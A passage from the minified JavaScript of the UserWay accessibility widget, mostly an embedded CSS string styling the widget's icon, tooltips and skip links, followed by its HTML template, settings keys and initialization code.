.uwaw-lang-list__circle{display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center;border-radius:50%;width:19px;height:19px;font-family:sans-serif;font-size:10px;color:#002481;background-color:#d8e3ff;border:1px solid #fff;position:absolute;left:-2px;top:-2px;padding:0}body .uwy.uen img .check_on{opacity:1!important;visibility:visible!important}@media only screen and (max-device-width:1024px){body .uwy .uit,body .uwy .uwif{display:none!important;opacity:1!important;visibility:visible!important}body .uwy.uon,body .uwy.uon .uit,body .uwy.uon .uwif{display:block!important}body .uwy .ufiw{display:none!important;opacity:1!important;visibility:visible!important}}.uwaw-dictionary-tooltip{transform:translate(-100%,-6px);margin-left:38px;width:300px;cursor:default;opacity:0;visibility:hidden;position:absolute;transition:transform .15s ease,opacity .15s ease,visibility .15s ease}.uwaw-dictionary-tooltip_active{opacity:1;visibility:visible;transform:translate(-100%,0)}.utb .uwaw-dictionary-tooltip{margin-left:50px}.uwaw-dictionary-tooltip__i{padding-top:20px}.uwaw-dictionary-tooltip__ii{background:#0a0910;border-radius:14px 0 14px 14px;position:relative;padding:16px 19px}.uwaw-dictionary-tooltip__ico{width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,.16);margin-right:9px;-ms-flex-pack:center;justify-content:center}.uwaw-dictionary-tooltip__ico .no-fill{fill:none!important}.uwaw-dictionary-tooltip__close,.uwaw-dictionary-tooltip__ico,.uwaw-dictionary-tooltip__title{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center}.uwaw-dictionary-tooltip__title{color:#fff;font-size:14px;line-height:20px;letter-spacing:-.11px;font-weight:600;font-family:Metropolis,sans-serif;padding-bottom:9px}.uwaw-dictionary-tooltip__close{position:absolute;right:17px;top:22px;width:28px;height:28px;border-radius:50%;background:#fff;border:none;-ms-flex-pack:center;justify-content:center;transition:opacity .3s ease;cursor:pointer;padding:0}.uwaw-dictionary-tooltip__close:hover{opacity:.7}.uwaw-dictionary-tooltip__description{font-family:Metropolis,sans-serif;color:#afabc2;font-size:14px;line-height:20px;padding-right:20px}.uwaw-dictionary-tooltip__description strong{color:#fff}.uwaw-dictionary-tooltip__tail{position:absolute;right:0;top:-15px}.uwaw-dictionary-tooltip__tail path{fill:#0a0910}.userway_p3 .uwaw-dictionary-tooltip,.userway_p4 .uwaw-dictionary-tooltip,.userway_p5 .uwaw-dictionary-tooltip{bottom:100%}.userway_p3 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__i,.userway_p4 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__i,.userway_p5 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__i{padding-bottom:16px}.userway_p3 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__ii,.userway_p4 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__ii{border-radius:14px 14px 0 14px}.userway_p3 .uwaw-dictionary-tooltip__tail,.userway_p4 .uwaw-dictionary-tooltip__tail,.userway_p5 .uwaw-dictionary-tooltip__tail{transform:rotate(180deg) scaleX(-1);top:auto;bottom:-13px}.userway_p5 .uwaw-dictionary-tooltip,.userway_p6 .uwaw-dictionary-tooltip,.userway_p7 .uwaw-dictionary-tooltip{margin-left:9px;left:0;transform:translateX(0)}.userway_p5 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__ii{border-radius:14px 14px 14px 0}.userway_p5 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__tail{transform:scaleX(1) rotate(180deg);left:0}.userway_p6 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__ii,.userway_p7 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__ii{border-radius:0 14px 14px 14px}.userway_p6 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__tail,.userway_p7 .uwaw-dictionary-tooltip .uwaw-dictionary-tooltip__tail{transform:scaleX(-1);right:auto;left:0}.uwy{z-index:2147483647;position:fixed!important;transform:none!important}.uwy .uai{text-align:initial!important;top:10px}.uwy .uai .userway_dictionary_popup_container.hidden,.uwy .uai.hidden,.uwy.hidden{display:none}.uwy.userway_p1 .uai{top:13px;right:auto;bottom:auto;left:calc(100vw - 21px);transform:translate(-100%)}.uwy.userway_p2 .uai,.uwy.userway_p3 .uai{top:50%;transform:translate(-100%,-50%);left:calc(100vw - 21px);right:auto}.uwy.userway_p3 .uai{top:auto;bottom:13px;transform:translate(-100%)}.uwy.userway_p4 .uai{top:auto;left:calc(50% - 22px);bottom:16px;right:auto}.uwy.userway_p4.userway_hidden{bottom:-30px;top:auto;right:auto}.uwy.userway_p4.userway_hidden.uo{bottom:13px}.uwy.userway_p4.userway_hidden .uai{transform:translate(-50%,100%)}.uwy.userway_p5 .uai{top:auto;bottom:13px;left:13px;right:auto}.uwy.userway_p6 .uai{top:50%;transform:translateY(-50%);left:13px;right:auto;bottom:auto}.uwy.userway_p7 .uai,.uwy.userway_p8 .uai{top:13px;left:13px;right:auto;bottom:auto}.uwy.userway_p8 .uai{left:50%;transform:translate(-50%)}.uwy.userway_p8.userway_hidden .uai{transform:translate(-50%,-100%)}.uwy.userway_p8.userway_hidden.uo{top:10px}.uwy.userway_p4 .uai,.uwy.userway_p8 .uai{left:50vw;transform:translateX(-50%)}.uwy.uon .uai{background:#007dd5!important}.uwy .uai img,.uwy.uon .uwif{display:block!important}.uwy .userway_ft_iframe_wrapper,.uwy.uon.umb .uai,.uwy.uon.usb .uai{display:none}.uwy .uai .ups.white .si_w,.uwy.userway_ft_on .uit{display:block}.uwy.uen .uai .check_on{opacity:1;visibility:visible;top:-4px;right:-4px}.uwy .uit,.uwy .uwif{position:fixed;top:0;left:0;bottom:0;right:0;width:100%!important;max-width:100%!important;height:100%!important;visibility:visible!important;opacity:0!important;background:0 0!important;border:none;margin:0;padding:0;overflow:hidden;z-index:inherit;display:none}.uwy .uai{position:fixed!important;cursor:pointer;background:#003d68!important;border-radius:50%!important;padding:3px;display:inline-block;width:40px;height:40px;min-width:40px;min-height:40px;max-width:40px;max-height:40px;box-sizing:content-box!important}.uwy .uai:active,.uwy .uai:focus,.uwy .uai:hover{background:#007dd5}.uwy .uai .ups,.uwy .uai .usr{position:absolute;background-color:transparent!important}.uwy .uai .ups{height:45px;width:45px;overflow:hidden;background-position:-48px -48px;background-size:140px;animation:standard .75s infinite linear;transform-origin:50% 50% 0!important;display:none;top:0;left:0}.uwy .uai .ups .si_w{display:block}.uwy .uai .ups .si_b,.uwy .uai .ups.white .si_b{display:none}.uwy .uai .ups .si_b,.uwy .uai .ups .si_w,.uwy.uac .loading:after{height:45px;width:45px;position:absolute;top:0;left:0}.uwy .uai .usr{z-index:-1!important;top:-10px;right:-10px;bottom:-10px;left:-10px;display:inline-block}.uwy .uai.uli .ui_w,.uwy .uai.uli .ups .si_w{display:none}.uwy .uai .ui_w,.uwy .uai.uli .ui_b,.uwy .uai.uli .ups .si_b,.uwy .uai.userway_dark .ups .si_w{display:block}.uwy .uai.loading .ups{display:block!important}.uwy .uai .ui_b,.uwy .uai.loading .ui_b,.uwy .uai.loading .ui_w,.uwy .uai.userway_dark .ups .si_b{display:none}.uwy .uai .check_on{position:absolute;top:-7px;right:-4px;width:18px;height:20px;transition:.1s;opacity:0;visibility:hidden;background:0 0!important;border:none!important;padding:0!important;margin:0!important}.uwy.utb .uai{padding:4px;width:57px;height:57px;min-width:57px;min-height:57px;max-width:57px;max-height:57px}.uwy.utb .uai .ups{height:57px;width:57px;top:4px;left:4px}.uwy.utb .uai .check_on{top:-2px;right:-2px;width:21px;height:21px}.uwy.utb.userway_p1,.uwy.utb.userway_p2,.uwy.utb.userway_p3{right:30px}.uwy.utb.userway_p3,.uwy.utb.userway_p4,.uwy.utb.userway_p5{bottom:30px}.uwy.utb.userway_p4.userway_hidden{top:auto}.uwy.utb.userway_p4.userway_hidden.uo{bottom:30px;margin:0!important}.uwy.utb.userway_p4.userway_hidden .uai{transform:translate(-50%,100%)}.uwy.utb.userway_p8.userway_hidden{top:13px}.uwy.utb.userway_p8.userway_hidden.uo{top:13px;margin:0}.uwy.utb.userway_p8.userway_hidden .uai{transform:translate(-50%,-100%)}.uwy.utb.userway_p6,.uwy.utb.userway_p7{left:11px}.uwy.utb .ups{top:10px;left:11px}.uwy.uac{border-radius:0!important}.uwy.uac .uai{border-radius:5px!important;width:auto;height:auto;max-height:initial;max-width:initial;min-height:initial;min-width:initial}.uwy.uac.userway_p1,.uwy.uac.userway_p2,.uwy.uac.userway_p3{right:50px}.uwy.uac.userway_p1.userway_hidden .uai,.uwy.uac.userway_p2.userway_hidden .uai,.uwy.uac.userway_p3.userway_hidden .uai{transform:translateX(95%)}.uwy.uac.userway_p5,.uwy.uac.userway_p6,.uwy.uac.userway_p7{left:50px}.uwy.uac.userway_p5.userway_hidden .uai,.uwy.uac.userway_p6.userway_hidden .uai,.uwy.uac.userway_p7.userway_hidden .uai{transform:translateX(-95%)}.uwy.uac.userway_p1 .uai,.uwy.uac.userway_p7 .uai,.uwy.uac.userway_p8 .uai{top:35px}.uwy.uac.userway_p3 .uai,.uwy.uac.userway_p4 .uai,.uwy.uac.userway_p5 .uai{bottom:35px}.uwy.uac.userway_p4 .uai,.uwy.uac.userway_p8 .uai{left:50vw;transform:translateX(-50%);margin:0 auto;right:auto}.uwy.uac.userway_p8.userway_hidden .uai{transform:translate(-50%,-130%)}.uwy.uac.userway_p4.userway_hidden .uai{transform:translate(-50%,130%)}.uwy.uac .loading{overflow:hidden}.uwy.uac .loading:after{content:"";width:50%;height:4px;background-color:#fff;transform:translateX(-220%);animation:.9s linear infinite block_loading}.uwy.uac .loading .ups{display:none!important}.uwy.uac .loading.uli:after{background-color:#000}.uwy.uac .uhi{top:44px}.uwy.userway_p1.userway_hidden .uai,.uwy.userway_p2.userway_hidden .uai,.uwy.userway_p3.userway_hidden .uai{transform:translate(100%,-50%)}.uwy.userway_p5.userway_hidden .uai,.uwy.userway_p6.userway_hidden .uai,.uwy.userway_p7.userway_hidden .uai{transform:translate(-100%,-50%)}.uwy.uac.utb.userway_hidden.userway_p4{bottom:35px}.uwy .uai{font-size:initial!important;transition:transform .4s!important}.uwy:not(.uh) .uai:hover{transform:scale(1.1)!important}.uwy:not(.uh).userway_p1 .uai:hover,.uwy:not(.uh).userway_p3 .uai:hover{transform:translate(-100%) scale(1.1)!important}.uwy:not(.uh).userway_p2 .uai:hover{transform:translate(-100%,-50%) scale(1.1)!important}.uwy:not(.uh).userway_p4 .uai:hover,.uwy:not(.uh).userway_p8 .uai:hover{transform:translateX(-50%) scale(1.1)!important}.uwy:not(.uh).userway_p6 .uai:hover{transform:translateY(-50%) scale(1.1)!important}.uwy .uwaw-lang-list__circle{display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center;border-radius:50%;width:19px;height:19px;font-family:sans-serif;font-size:10px;color:#002481;background-color:#d8e3ff;border:1px solid #fff;position:absolute;left:-2px;top:-2px;padding:0}.uwy.uen img .check_on{opacity:1!important;visibility:visible!important}@media only screen and (max-device-width:1024px){.uwy .uit,.uwy .uwif{display:none!important;opacity:1!important;visibility:visible!important}.uwy.uon,.uwy.uon .uit,.uwy.uon .uwif{display:block!important}.uwy .ufiw{display:none!important;opacity:1!important;visibility:visible!important}}.uw-sl{transition:background .1s ease;background:0 0;z-index:2147483638;position:fixed}.uw-sl:focus-within{width:100%;background:rgba(0,0,0,.25);z-index:2147483638;position:fixed;left:0;right:0;top:0;bottom:0}.uw-sl__item{box-sizing:border-box;left:38px;top:-70px;position:fixed!important;display:-ms-flexbox!important;display:flex!important;-ms-flex-align:center!important;align-items:center!important;-ms-flex-pack:justify!important;justify-content:space-between!important;background:#fff!important;border-radius:8px!important;border:2px solid #0038ff!important;max-width:315px;padding:0 15px 0 0!important;text-align:left!important;width:100%!important;height:63px!important;box-shadow:0 0 0 4px rgba(0,56,255,.22)!important;opacity:0;transition:top .2s,opacity .2s}.uw-sl__item:focus{top:40px;opacity:1;outline:1px solid rgba(255,255,255,0);background:#fff!important}.uw-sl__item:hover{background:#fff!important}.uw-sl__item__img{width:57px;display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center}.uw-sl__item__img svg{width:auto!important;height:auto!important}.uw-sl .uw-sl__e-icon path,.uw-sl__item__img path{fill:#000!important}.uw-sl .uw-sl__e-icon .no-fill,.uw-sl__item__img .no-fill{fill:none!important}.uw-sl .uw-sl__e-icon,.uw-sl__item__left,.uw-sl__item__title{display:-ms-flexbox!important;display:flex!important;-ms-flex-align:center!important;align-items:center!important}.uw-sl__item__title{font-size:14px;line-height:16px;font-weight:500!important;letter-spacing:-.06px;width:calc(100% - 53px);font-family:"Metropolis",Aria,Helvetica,sans-serif!important;color:#000;-ms-flex-pack:justify!important;justify-content:space-between!important}.uw-sl .uw-sl__e-icon,.uw-sl__item__left{-ms-flex-pack:start!important;justify-content:flex-start!important}.uw-sl .uw-sl__e-icon{-ms-flex-pack:center!important;justify-content:center!important;width:26px;height:27px}.accessibility-btn{border:2px solid #fff;padding:10px 22px;box-sizing:border-box;text-align:center}.accessibility-btn__text{display:block;font-size:15px;line-height:normal!important;color:#fff;font-weight:500;letter-spacing:.2px}.big-uw-icon .accessibility-btn__text,.utb .accessibility-btn__text{font-size:16px;letter-spacing:.4px;line-height:normal!important}.light .accessibility-btn__text,.uli .accessibility-btn__text{color:#000}.light .accessibility-btn,.uli .accessibility-btn{border-color:#000}',
    Nt = '<div class="uai" id="userwayAccessibilityIcon" aria-label="Open accessibility menu" role="button" tabindex="0"><span class="uiiw"></span><div class="ups"></div><span class="usr"></span><div class="uwaw-dictionary-tooltip"></div></div><iframe class="uwif" data-uw-ignore-translate="true" name="userway" title="UserWay Accessibility Menu"></iframe>',
    Mt = "userway-positionWidget",
    Pt = "userway-positionWidgetMobile",
    Rt = "userway-selectedLang",
    Ft = null,
    Dt = !1,
    Ht = null,
    Bt = !1,
    zt = !1,
    qt = !1,
    Vt = !1,
    jt = ["widget_position_nudge", "widget_position_nudge_mobile"],
    Gt = {
      leftRightSide: {
        top: 13,
        right: 13,
        bottom: 16,
        left: 13
      },
      middle: {
        left: 50,
        top: 50
      }
    },
    Yt = ["s9", "s11", "s18", "s21", "s24", "s101", "s102", "s103", "s104", "s105", "s106", "s107", "s108"];
  nt.init = e, nt.isSoundEffectsEnabled = c, nt.setPageStructureModalColor = H;
  var Kt;
  nt.manageIconVisibility = re, nt.toggleWidget = oe, nt.openWidget = de, nt.closeWidget = ce, nt.getAvailableBunchOfFeatures = ge, nt.setFeature = me, nt.getFeaturesSettings = function () {
    if (at.services.paidAi || !at.services.hasOwnProperty("paidAi")) return at.settings;
    var e = {};
    return Object.keys(at.settings).forEach(function (t) {
      at.settings.hasOwnProperty(t) && -1 === Yt.indexOf(t) && (e[t] = at.settings[t]);
    }), e;
  }, nt.lazyLoad = Ae, nt.preloadIframe = Te, "loading" === document.readyState ? document.addEventListener("DOMContentLoaded", function () {
    return e();
  }) : e();
}();